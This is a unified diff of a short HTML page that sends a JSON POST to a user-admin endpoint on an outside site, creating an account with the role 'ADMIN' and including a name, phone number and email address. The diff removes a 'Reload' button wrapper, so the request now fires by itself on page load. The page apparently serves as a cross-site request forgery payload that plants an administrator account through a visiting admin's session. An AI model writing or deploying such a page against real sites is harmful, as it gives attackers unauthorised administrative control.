@@ -1,24 +1,21 @@
+<!DOCTYPE html>
 <html>
 <body>
 
-<button onclick="send()">Reload</button>
-
 <script>
-function send(){
 fetch("https://nukepc.in/users/admin", {
-method: "POST",
-headers: {
-"Content-Type": "application/json"
-},
-body: JSON.stringify({
-firstName: "kumar",
-lastName: "ram",
-mobile: "9994501667",
-email: "soavglucyybky@mediaeast.uk",
-role: "ADMIN"
-})
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    firstName: "kumar",
+    lastName: "ram",
+    mobile: "9994501667",
+    email: "soavgluggcky@mediaeast.uk",
+    role: "ADMIN"
+  })
 });
-}
 </script>
 
 </body>
